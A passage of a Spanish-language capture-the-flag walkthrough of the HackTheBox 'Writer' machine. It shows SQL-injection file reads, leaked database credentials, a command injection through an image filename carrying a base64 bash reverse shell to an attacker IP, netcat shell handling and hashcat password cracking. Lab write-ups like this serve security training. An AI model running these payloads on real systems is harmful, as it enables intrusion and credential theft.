</span></span><span style=display:flex><span>  ..                                  D        0  Tue Jun 22 13:55:06 2021
</span></span><span style=display:flex><span>  static                              D        0  Sun May 16 16:29:16 2021
</span></span><span style=display:flex><span>  staticfiles                         D        0  Fri Jul  9 06:59:42 2021
</span></span><span style=display:flex><span>  writer_web                          D        0  Wed May 19 11:26:18 2021
</span></span><span style=display:flex><span>  requirements.txt                    N       15  Mon Aug  2 19:46:01 2021
</span></span><span style=display:flex><span>  writerv2                            D        0  Wed May 19 08:32:41 2021
</span></span><span style=display:flex><span>  manage.py                           N      806  Mon Aug  2 19:46:01 2021
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>                7151096 blocks of size 1024. 1985880 blocks available
</span></span><span style=display:flex><span>smb: \&gt; recurse ON
</span></span><span style=display:flex><span>smb: \&gt; prompt OFF
</span></span><span style=display:flex><span>smb: \&gt; mget *
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>Una vez descargados, vemos que se trata de un proyecto de Django (otro <em>framework</em> web hecho en Python). Parece que el proyecto está sin terminar, pero es suficiente para encontrar otras credenciales de MySQL.</p><p>La contraseña se obtiene en el archivo <code>writer2_project/writer2/settings.py</code>, como se muestra en el siguiente fragmento de código:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Database</span>
</span></span><span style=display:flex><span><span style=color:#75715e># https://docs.djangoproject.com/en/1.10/ref/settings/#databases</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>DATABASES <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;default&#39;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;ENGINE&#39;</span>: <span style=color:#e6db74>&#39;django.db.backends.mysql&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;OPTIONS&#39;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;read_default_file&#39;</span>: <span style=color:#e6db74>&#39;/etc/mysql/my.cnf&#39;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Entonces podemos mirar el archivo <code>/etc/mysql/my.cnf</code> utilizando la vulnerabilidad de SQLi:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python sqli.py /etc/mysql/my.cnf
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-toml data-lang=toml><span style=display:flex><span><span style=color:#75715e># The MariaDB configuration file</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># The MariaDB/MySQL tools read configuration files in the following order:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 1. &#34;/etc/mysql/mariadb.cnf&#34; (this file) to set global defaults,</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 2. &#34;/etc/mysql/conf.d/*.cnf&#34; to set global options.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 3. &#34;/etc/mysql/mariadb.conf.d/*.cnf&#34; to set MariaDB-only options.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 4. &#34;~/.my.cnf&#34; to set user-specific options.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># If the same option is defined multiple times, the last one will apply.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># One can use all long options that the program supports.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Run program with --help to get a list of available options and with</span>
</span></span><span style=display:flex><span><span style=color:#75715e># --print-defaults to see which it would actually understand and use.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># This group is read both both by the client and the server</span>
</span></span><span style=display:flex><span><span style=color:#75715e># use it for options that affect everything</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span>[<span style=color:#a6e22e>client-server</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Import all .cnf files from configuration directory</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>!</span><span style=color:#a6e22e>includedir</span> <span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>etc</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>mysql</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>conf</span>.<span style=color:#a6e22e>d</span><span style=color:#960050;background-color:#1e0010>/</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>!</span><span style=color:#a6e22e>includedir</span> <span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>etc</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>mysql</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>mariadb</span>.<span style=color:#a6e22e>conf</span>.<span style=color:#a6e22e>d</span><span style=color:#960050;background-color:#1e0010>/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[<span style=color:#a6e22e>client</span>]
</span></span><span style=display:flex><span><span style=color:#a6e22e>database</span> = <span style=color:#a6e22e>dev</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>user</span> = <span style=color:#a6e22e>djangouser</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>password</span> = <span style=color:#a6e22e>DjangoSuperPassword</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>default-character-set</span> = <span style=color:#a6e22e>utf8</span>
</span></span></code></pre></div><p>Y tenemos más credenciales para MySQL: <code>djangouser:DjangoSuperPassword</code>.</p><h2 id=intrusión-en-la-máquina>Intrusión en la máquina</h2><p>En el panel de administración, podemos controlar todo el <em>blog</em> (crear artículos, editarlos e incluso borrarlos):</p><p><img src=/images/HTB/Writer/Writer-stories.png alt="Writer stories"></p><p>El formulario utilizado para crear un nuevo artículo es el siguiente:</p><p><img src=/images/HTB/Writer/Writer-add1.png alt="Writer add story (image by file)"></p><p>Existen dos maneras de subir una imagen para el artículo: como archivo o como URL.</p><p><img src=/images/HTB/Writer/Writer-add2.png alt="Writer add story (image by URL)"></p><p>La diferencia entre las dos últimas capturas es la caja de texto de imagen, la diferencia es muy sutil.</p><p>Para obtener acceso a la máquina, podemos volver a leer el <code>__init__.py</code>. El <em>script</em> hace algo raro al recibir las imágenes en las siguientes líneas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>files[<span style=color:#e6db74>&#39;image&#39;</span>]:
</span></span><span style=display:flex><span>        image <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>files[<span style=color:#e6db74>&#39;image&#39;</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;.jpg&#34;</span> <span style=color:#f92672>in</span> image<span style=color:#f92672>.</span>filename:
</span></span><span style=display:flex><span>            path <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(<span style=color:#e6db74>&#39;/var/www/writer.htb/writer/static/img/&#39;</span>, image<span style=color:#f92672>.</span>filename)
</span></span><span style=display:flex><span>            image<span style=color:#f92672>.</span>save(path)
</span></span><span style=display:flex><span>            image <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/img/</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(image<span style=color:#f92672>.</span>filename)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;File extensions must be in .jpg!&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;add.html&#39;</span>, error<span style=color:#f92672>=</span>error)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;image_url&#39;</span>):
</span></span><span style=display:flex><span>        image_url <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;image_url&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;.jpg&#34;</span> <span style=color:#f92672>in</span> image_url:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>                local_filename, headers <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>urlretrieve(image_url)
</span></span><span style=display:flex><span>                os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;mv </span><span style=color:#e6db74>{}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>.jpg&#34;</span><span style=color:#f92672>.</span>format(local_filename, local_filename))
</span></span><span style=display:flex><span>                image <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>.jpg&#34;</span><span style=color:#f92672>.</span>format(local_filename)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>                    im <span style=color:#f92672>=</span> Image<span style=color:#f92672>.</span>open(image)
</span></span><span style=display:flex><span>                    im<span style=color:#f92672>.</span>verify()
</span></span><span style=display:flex><span>                    im<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>                    image <span style=color:#f92672>=</span> image<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;/tmp/&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>                    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;mv /tmp/</span><span style=color:#e6db74>{}</span><span style=color:#e6db74> /var/www/writer.htb/writer/static/img/</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(image, image))
</span></span><span style=display:flex><span>                    image <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/img/</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(image)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>except</span> PIL<span style=color:#f92672>.</span>UnidentifiedImageError:
</span></span><span style=display:flex><span>                    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;rm </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(image))
</span></span><span style=display:flex><span>                    error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Not a valid image file!&#34;</span>
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;add.html&#39;</span>, error<span style=color:#f92672>=</span>error)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>                error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Issue uploading picture&#34;</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;add.html&#39;</span>, error<span style=color:#f92672>=</span>error)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;File extensions must be in .jpg!&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;add.html&#39;</span>, error<span style=color:#f92672>=</span>error)
</span></span></code></pre></div><p>Estas líneas aparecen tanto en <code>/dashboard/stories/add</code> como en <code>/dashboard/stories/edit/&lt;id></code>. Como se dijo previamente, hay dos maneras de subir una imagen. Una subiéndola directamente como archivo y otra indicando la URL donde se localiza la imagen.</p><p>La documentación de <code>urllib.requests.urlretrieve()</code> dice lo siguiente:</p><blockquote><p><strong>retrieve</strong>(<em>url</em>, <em>filename=None</em>, <em>reporthook=None</em>, <em>data=None</em>): Retrieves the contents of <em>url</em> and places it in <em>filename</em>. The return value is a tuple consisting of a local filename [&mldr;]. If <em>filename</em> is not given and the URL refers to a local file, the input filename is returned. If the URL is non-local and <em>filename</em> is not given, the filename is the output of <code>tempfile.mktemp()</code> with a suffix that matches the suffix of the last path component of the input URL. [&mldr;].</p></blockquote><p>Esto significa que si la URL apunta a un archivo local, el nombre del archivo será el mismo que el que se pide por la URL. Pero si el archivo se obtiene del exterior, entonces se elige un nombre aleatorio.</p><p>La vulnerabilidad está en la llamada a <code>os.system</code> con una entrada de usuario peculiar. La idea es subir un archivo cuyo nombre sea <code>image.jpg x;shell-command</code>, para no romper el comando <code>mv</code>, que necesita dos parámetros, y ejecutar así el comando que queremos. El comando resultante será así:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>mv image.jpg x;shell-command; image.jpg x;shell-command;.jpg
</span></span></code></pre></div><p>La extensión <code>.jpg</code> no será un problema porque el servidor solamente verifica que la cadena <code>".jpg"</code> está incluida en el nombre del archivo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>image_url <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;image_url&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;.jpg&#34;</span> <span style=color:#f92672>in</span> image_url:
</span></span><span style=display:flex><span>    <span style=color:#75715e># ...</span>
</span></span></code></pre></div><p>Después, tenemos que intentar subir otra imagen, pero esta vez mediante URL (utilizando el esquema <code>file://</code>), de manera que el archivo se toma de la propia máquina y el nombre del archivo no se cambie. Será entonces cuando el comando inyectado se ejecutará en la llamada a <code>os.system</code>.</p><p>Generamos el comando malicioso como una <em>reverse shell</em> codificada en Base64:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ echo -n <span style=color:#e6db74>&#39;bash -i  &gt;&amp; /dev/tcp/10.10.17.44/4444 0&gt;&amp;1&#39;</span> | base64
</span></span><span style=display:flex><span>YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</span></span></code></pre></div><p>Luego, creamos el archivo <code>fdsa.jpg x;echo &lt;b64>|base64 -d|bash;</code> y lo subimos como fichero.</p><p>Después, lo volvemos a subir con la siguiente URL: <code>file:///var/www/writer.htb/writer/static/img/fdsa.jpg x;echo &lt;b64>|base64 -d|bash;</code>. El uso de <code>file://</code> es necesario para que la URL apunte a un archivo local.</p><p>Utilizando <code>nc</code>, obtenemos acceso a la máquina como <code>www-data</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ nc -nlvp <span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>Ncat: Version 7.92 ( https://nmap.org/ncat )
</span></span><span style=display:flex><span>Ncat: Listening on :::4444
</span></span><span style=display:flex><span>Ncat: Listening on 0.0.0.0:4444
</span></span><span style=display:flex><span>Ncat: Connection from 10.10.11.101.
</span></span><span style=display:flex><span>Ncat: Connection from 10.10.11.101:36806.
</span></span><span style=display:flex><span>bash: cannot set terminal process group (1055): Inappropriate ioctl for device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@writer:/$ script /dev/null -c bash
</span></span><span style=display:flex><span>script /dev/null -c bash
</span></span><span style=display:flex><span>Script started, file is /dev/null
</span></span><span style=display:flex><span>www-data@writer:/$ ^Z
</span></span><span style=display:flex><span>zsh: suspended  ncat -nlvp 4444
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ stty raw -echo; fg
</span></span><span style=display:flex><span>[1]  + continued  ncat -nlvp 4444
</span></span><span style=display:flex><span>                                 reset xterm
</span></span><span style=display:flex><span>www-data@writer:/$ export TERM=xterm
</span></span><span style=display:flex><span>www-data@writer:/$ export SHELL=bash
</span></span><span style=display:flex><span>www-data@writer:/$ stty rows 50 columns 158
</span></span></code></pre></div><p>Todo el proceso de intrusión se encuentra automatizado en un <em>script</em> en Python llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Writer/foothold.py><code>foothold.py</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Writer#footholdpy>aquí</a>).</p><h2 id=enumeración-del-sistema>Enumeración del sistema</h2><p>Ahora podemos recordar que teníamos otras credenciales de MySQL (<code>djangouser:DjangoSuperPassword</code>). Y de hecho, con estas podemos encontrar otro <em>hash</em> de contraseña:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@writer:/var/www/writer2_project$ mysql -u djangouser -p
</span></span><span style=display:flex><span>Enter password:
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>MariaDB [dev]&gt; show databases;
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span>| Database           |
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span>| dev                |
</span></span><span style=display:flex><span>| information_schema |
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span>2 rows in set (0.000 sec)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>MariaDB [dev]&gt; use dev;
</span></span><span style=display:flex><span>Database changed
</span></span><span style=display:flex><span>MariaDB [dev]&gt; show tables;
</span></span><span style=display:flex><span>+----------------------------+
</span></span><span style=display:flex><span>| Tables_in_dev              |
</span></span><span style=display:flex><span>+----------------------------+
</span></span><span style=display:flex><span>| auth_group                 |
</span></span><span style=display:flex><span>| auth_group_permissions     |
</span></span><span style=display:flex><span>| auth_permission            |
</span></span><span style=display:flex><span>| auth_user                  |
</span></span><span style=display:flex><span>| auth_user_groups           |
</span></span><span style=display:flex><span>| auth_user_user_permissions |
</span></span><span style=display:flex><span>| django_admin_log           |
</span></span><span style=display:flex><span>| django_content_type        |
</span></span><span style=display:flex><span>| django_migrations          |
</span></span><span style=display:flex><span>| django_session             |
</span></span><span style=display:flex><span>+----------------------------+
</span></span><span style=display:flex><span>10 rows in set (0.001 sec)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>MariaDB [dev]&gt; describe auth_user;
</span></span><span style=display:flex><span>+--------------+--------------+------+-----+---------+----------------+
</span></span><span style=display:flex><span>| Field        | Type         | Null | Key | Default | Extra          |
</span></span><span style=display:flex><span>+--------------+--------------+------+-----+---------+----------------+
</span></span><span style=display:flex><span>| id           | int(11)      | NO   | PRI | NULL    | auto_increment |
</span></span><span style=display:flex><span>| password     | varchar(128) | NO   |     | NULL    |                |
</span></span><span style=display:flex><span>| last_login   | datetime(6)  | YES  |     | NULL    |                |
</span></span><span style=display:flex><span>| is_superuser | tinyint(1)   | NO   |     | NULL    |                |
</span></span><span style=display:flex><span>| username     | varchar(150) | NO   | UNI | NULL    |                |
</span></span><span style=display:flex><span>| first_name   | varchar(150) | NO   |     | NULL    |                |
</span></span><span style=display:flex><span>| last_name    | varchar(150) | NO   |     | NULL    |                |
</span></span><span style=display:flex><span>| email        | varchar(254) | NO   |     | NULL    |                |
</span></span><span style=display:flex><span>| is_staff     | tinyint(1)   | NO   |     | NULL    |                |
</span></span><span style=display:flex><span>| is_active    | tinyint(1)   | NO   |     | NULL    |                |
</span></span><span style=display:flex><span>| date_joined  | datetime(6)  | NO   |     | NULL    |                |
</span></span><span style=display:flex><span>+--------------+--------------+------+-----+---------+----------------+
</span></span><span style=display:flex><span>11 rows in set (0.002 sec)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>MariaDB [dev]&gt; select username, password from auth_user;
</span></span><span style=display:flex><span>+----------+------------------------------------------------------------------------------------------+
</span></span><span style=display:flex><span>| username | password                                                                                 |
</span></span><span style=display:flex><span>+----------+------------------------------------------------------------------------------------------+
</span></span><span style=display:flex><span>| kyle     | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= |
</span></span><span style=display:flex><span>+----------+------------------------------------------------------------------------------------------+
</span></span><span style=display:flex><span>1 row in set (0.001 sec)
</span></span></code></pre></div><p>Esta vez el <em>hash</em> se rompe usando <code>hashcat</code>, y se obtiene la contraseña del usuario <code>kyle</code> (<code>marcoantonio</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ hashcat --example-hashes | grep -C <span style=color:#ae81ff>2</span> pbkdf2_sha256
</span></span><span style=display:flex><span>MODE: 10000
</span></span><span style=display:flex><span>TYPE: Django (PBKDF2-SHA256)
</span></span><span style=display:flex><span>HASH: pbkdf2_sha256$10000$1135411628$bFYX62rfJobJ07VwrUMXfuffLfj2RDM2G6/BrTrUWkE=
</span></span><span style=display:flex><span>PASS: hashcat
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ hashcat -m <span style=color:#ae81ff>10000</span> hash /usr/share/wordlists/rockyou.txt --quiet
</span></span><span style=display:flex><span>pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
</span></span></code></pre></div><h2 id=movimiento-lateral-al-usuario-john>Movimiento lateral al usuario <code>john</code></h2><p>Ahora podemos acceder como <code>kyle</code> por SSH. Y tenemos a <em>flag</em> de <code>user.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ ssh kyle@10.10.11.101
</span></span><span style=display:flex><span>kyle@10.10.11.101&#39;s password:
</span></span><span style=display:flex><span>kyle@writer:~$ cat user.txt
</span></span><span style=display:flex><span>2f1aa903cb62c07380d1d452ef397cf1
</span></span></code></pre></div><p>Podemos darnos cuenta de que <code>kyle</code> pertenece al grupo <code>filter</code>. Como miembro de este grupo, podemos leer y escribir en un <em>script</em> llamado <code>/etc/postfix/disclaimer</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>kyle@writer:~$ id
</span></span><span style=display:flex><span>uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
</span></span><span style=display:flex><span>kyle@writer:~$ find / -group filter 2&gt;/dev/null
</span></span><span style=display:flex><span>/etc/postfix/disclaimer
</span></span><span style=display:flex><span>/var/spool/filter
</span></span><span style=display:flex><span>kyle@writer:~$ find / -group filter 2&gt;/dev/null | xargs ls -la
</span></span><span style=display:flex><span>-rwxrwxr-x 1 root   filter 1021 Aug 25 23:56 /etc/postfix/disclaimer
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>/var/spool/filter:
</span></span><span style=display:flex><span>total 8
</span></span><span style=display:flex><span>drwxr-x--- 2 filter filter 4096 May 13 22:31 .
</span></span><span style=display:flex><span>drwxr-xr-x 7 root   root   4096 May 18 16:54 ..
</span></span></code></pre></div><p>Este <em>script</em> <code>/etc/postfix/disclaimer</code> es el siguiente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e>#!/bin/sh
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e># Localize these.</span>
</span></span><span style=display:flex><span>INSPECT_DIR<span style=color:#f92672>=</span>/var/spool/filter
</span></span><span style=display:flex><span>SENDMAIL<span style=color:#f92672>=</span>/usr/sbin/sendmail
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Get disclaimer addresses</span>
</span></span><span style=display:flex><span>DISCLAIMER_ADDRESSES<span style=color:#f92672>=</span>/etc/postfix/disclaimer_addresses
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Exit codes from &lt;sysexits.h&gt;</span>
</span></span><span style=display:flex><span>EX_TEMPFAIL<span style=color:#f92672>=</span><span style=color:#ae81ff>75</span>
</span></span><span style=display:flex><span>EX_UNAVAILABLE<span style=color:#f92672>=</span><span style=color:#ae81ff>69</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Clean up when done or when aborting.</span>
</span></span><span style=display:flex><span>trap <span style=color:#e6db74>&#34;rm -f in.</span>$$<span style=color:#e6db74>&#34;</span> <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>2</span> <span style=color:#ae81ff>3</span> <span style=color:#ae81ff>15</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Start processing.</span>
</span></span><span style=display:flex><span>cd $INSPECT_DIR <span style=color:#f92672>||</span> <span style=color:#f92672>{</span> echo $INSPECT_DIR does not exist; exit
</span></span><span style=display:flex><span>$EX_TEMPFAIL; <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cat &gt;in.$$ <span style=color:#f92672>||</span> <span style=color:#f92672>{</span> echo Cannot save mail to file; exit $EX_TEMPFAIL; <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># obtain From address</span>
</span></span><span style=display:flex><span>from_address<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>grep -m <span style=color:#ae81ff>1</span> <span style=color:#e6db74>&#34;From:&#34;</span> in.$$ | cut -d <span style=color:#e6db74>&#34;&lt;&#34;</span> -f <span style=color:#ae81ff>2</span> | cut -d <span style=color:#e6db74>&#34;&gt;&#34;</span> -f 1<span style=color:#e6db74>`</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>`</span>grep -wi ^<span style=color:#e6db74>${</span>from_address<span style=color:#e6db74>}</span>$ <span style=color:#e6db74>${</span>DISCLAIMER_ADDRESSES<span style=color:#e6db74>}</span><span style=color:#e6db74>`</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>  /usr/bin/altermime --input<span style=color:#f92672>=</span>in.$$ <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>                   --disclaimer<span style=color:#f92672>=</span>/etc/postfix/disclaimer.txt <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>                   --disclaimer-html<span style=color:#f92672>=</span>/etc/postfix/disclaimer.txt <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>                   --xheader<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&#34;</span> <span style=color:#f92672>||</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>                    <span style=color:#f92672>{</span> echo Message content rejected; exit $EX_UNAVAILABLE; <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$SENDMAIL <span style=color:#e6db74>&#34;</span>$@<span style=color:#e6db74>&#34;</span> &lt;in.$$
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exit $?
